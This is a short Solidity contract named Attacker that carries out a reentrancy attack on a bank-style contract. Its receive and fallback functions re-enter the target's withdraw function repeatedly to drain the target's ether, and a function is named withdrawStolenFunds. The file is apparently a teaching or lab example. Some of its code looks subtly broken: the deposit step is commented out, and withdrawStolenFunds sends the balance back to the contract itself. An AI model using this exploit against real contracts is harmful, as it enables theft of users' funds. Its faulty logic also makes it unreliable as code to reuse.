//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// import {IERC20} from '../lib/forge-std/src/interfaces/IERC20.sol';
interface IeBank {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IeBank targetContract;

    constructor(address target) {
        targetContract = IeBank(target);
    }

    fallback() external {
        if (address(targetContract).balance >= 1 ether) {
            targetContract.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // targetContract.deposit{value: 1 ether}();
        targetContract.withdraw(1 ether);
    }

    function withdrawStolenFunds() public {
        payable(address(this)).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw(address(targetContract).balance);
        }
    }
}
